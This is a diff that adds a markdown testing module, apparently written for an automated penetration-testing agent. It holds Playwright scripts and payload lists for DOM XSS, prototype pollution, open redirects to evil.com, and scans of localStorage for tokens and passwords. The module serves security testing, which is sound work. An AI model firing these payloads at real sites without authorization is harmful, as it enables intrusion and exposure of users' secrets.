@@ -1,0 +1,192 @@
+## Browser-Based Client-Side Security Testing Methodology
+
+Load this module when: SPA frameworks (React, Vue, Angular, Svelte, Next.js) are detected,
+or when static tools cannot reach JavaScript-rendered content.
+
+### Phase 0 — SPA Route Discovery
+Use browser_crawl to discover JS-rendered routes before running targeted tests:
+```
+browser_crawl(url="{target}", depth=2, max_pages=30)
+```
+Look for: pages with `has_script_sinks=true`, `has_forms=true`, `has_localstorage=true`, `js_errors`.
+
+---
+
+### DOM XSS Testing
+
+**URL Fragment Injection**
+```python
+await page.goto(f"{url}#<img src=x onerror=alert(1)>")
+await page.wait_for_timeout(1500)
+content = await page.content()
+alert_fired = "alert" in content or await page.evaluate("typeof window._xss_fired !== 'undefined'")
+print(f"DOM XSS via fragment: {alert_fired}")
+```
+
+**postMessage Injection**
+```python
+await page.goto(url)
+await page.evaluate("""
+    window.addEventListener('message', (e) => {
+        if (e.data && typeof e.data === 'string') {
+            document.getElementById('output') && (document.getElementById('output').innerHTML = e.data);
+        }
+    });
+    window.postMessage('<img src=x onerror=window._xss=1>', '*');
+""")
+await page.wait_for_timeout(1000)
+xss = await page.evaluate("window._xss === 1")
+print(f"postMessage XSS: {xss}")
+```
+
+**document.referrer Injection**
+```python
+# Navigate from a crafted referrer page
+await page.goto(f"data:text/html,<script>location='{{url}}?test=1'</script>")
+await page.wait_for_timeout(2000)
+content = await page.content()
+print(f"Referrer sink content: {content[:500]}")
+```
+
+**URL Parameter Sinks**
+```python
+payloads = [
+    f"{url}?q=<script>window._xss=1</script>",
+    f"{url}?redirect=javascript:window._xss=1",
+    f"{url}?callback=alert",
+    f"{url}?next=javascript:void(0)",
+]
+for p in payloads:
+    await page.goto(p)
+    await page.wait_for_timeout(1000)
+    xss = await page.evaluate("window._xss === 1")
+    content = await page.content()
+    print(f"URL param XSS [{p}]: fired={xss}, reflected={'_xss=1' in content}")
+```
+
+---
+
+### Prototype Pollution Testing
+
+**Via URL Parameters**
+```python
+pollution_urls = [
+    f"{url}?__proto__[polluted]=yes",
+    f"{url}?constructor[prototype][polluted]=yes",
+    f"{url}?__proto__.polluted=yes",
+]
+for p_url in pollution_urls:
+    await page.goto(p_url)
+    await page.wait_for_timeout(1000)
+    polluted = await page.evaluate("({}).polluted")
+    print(f"Prototype pollution [{p_url}]: {polluted}")
+```
+
+**Via JSON Body (API endpoints)**
+```python
+import json
+response = await page.request.post(f"{url}/api/update", data=json.dumps({
+    "__proto__": {"polluted": "yes"},
+    "constructor": {"prototype": {"polluted": "yes"}},
+}), headers={"Content-Type": "application/json"})
+result = await page.evaluate("({}).polluted")
+print(f"JSON prototype pollution: {result}")
+```
+
+---
+
+### Client-Side Open Redirect Testing
+
+```python
+redirect_payloads = [
+    f"{url}?redirect=https://evil.com",
+    f"{url}?url=https://evil.com",
+    f"{url}?next=https://evil.com",
+    f"{url}?returnUrl=https://evil.com",
+    f"{url}?goto=//evil.com",
+    f"{url}?target=javascript:window._redirect=1",
+]
+for p in redirect_payloads:
+    response = await page.goto(p, wait_until="commit")
+    final_url = page.url
+    js_redirect = await page.evaluate("window._redirect === 1")
+    is_redirected = "evil.com" in final_url or js_redirect
+    print(f"Open redirect [{p}]: {is_redirected} (final: {final_url})")
+```
+
+---
+
+### localStorage / sessionStorage Sensitive Data Exposure
+
+```python
+await page.goto(url)
+await page.wait_for_timeout(2000)  # wait for app to initialise
+local_data = await page.evaluate("JSON.stringify(localStorage)")
+session_data = await page.evaluate("JSON.stringify(sessionStorage)")
+
+sensitive_patterns = ["token", "password", "secret", "key", "auth", "jwt", "session", "credential"]
+findings = []
+for storage_name, data in [("localStorage", local_data), ("sessionStorage", session_data)]:
+    if data and data != "{}":
+        for pattern in sensitive_patterns:
+            if pattern.lower() in data.lower():
+                findings.append(f"{storage_name} contains potentially sensitive key matching '{pattern}'")
+
+print(f"localStorage: {local_data[:500]}")
+print(f"sessionStorage: {session_data[:500]}")
+print(f"Sensitive data findings: {findings}")
+```
+
+---
+
+### eval() / innerHTML Sink Detection
+
+```python
+await page.goto(url)
+# Instrument dangerous sinks before navigation
+await page.add_init_script("""
+    window._sinks = [];
+    const _origEval = window.eval;
+    window.eval = function(s) { window._sinks.push({sink: 'eval', value: String(s).slice(0, 100)}); return _origEval(s); };
+    const _origWrite = document.write;
+    document.write = function(s) { window._sinks.push({sink: 'document.write', value: String(s).slice(0, 100)}); return _origWrite.call(document, s); };
+    Element.prototype._origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
+    Object.defineProperty(Element.prototype, 'innerHTML', {
+        set: function(v) { window._sinks.push({sink: 'innerHTML', value: String(v).slice(0, 100)}); this._origInnerHTML(v); }
+    });
+""")
+await page.goto(url)
+await page.wait_for_timeout(2000)
+sinks = await page.evaluate("window._sinks || []")
+print(f"Dangerous sinks detected: {sinks}")
+```
+
+---
+
+### Full DOM XSS Assessment Script (delegate to coder sub-agent for complex targets)
+
+For complex targets, use `delegate_to_coder` to write a comprehensive Playwright script that:
+1. Instruments all dangerous sinks (innerHTML, eval, document.write, setTimeout with string)
+2. Iterates all input fields and URL parameters with XSS payloads
+3. Checks postMessage handlers
+4. Tests SPA route transitions for reflected content
+5. Checks localStorage/sessionStorage after auth flows
+
+---
+
+### Interpreting Results
+
+| Finding | Severity | CWE | OWASP |
+|---------|----------|-----|-------|
+| DOM XSS via URL fragment/param | High | CWE-79 | A03:2021 |
+| DOM XSS via postMessage | High | CWE-79 | A03:2021 |
+| Prototype pollution | Medium-High | CWE-1321 | A03:2021 |
+| Client-side open redirect | Medium | CWE-601 | A01:2021 |
+| Sensitive data in localStorage | Medium | CWE-922 | A02:2021 |
+| Unguarded eval/innerHTML sinks | Medium | CWE-79 | A03:2021 |
+
+### Evidence to Capture
+- Screenshot showing payload reflection or alert: `screenshot_path=/output/xss_evidence.png`
+- DOM snapshot: save `page.content()` to `/output/dom_snapshot.html`
+- Console output including any error messages
+- Full URL with payload that triggered the finding
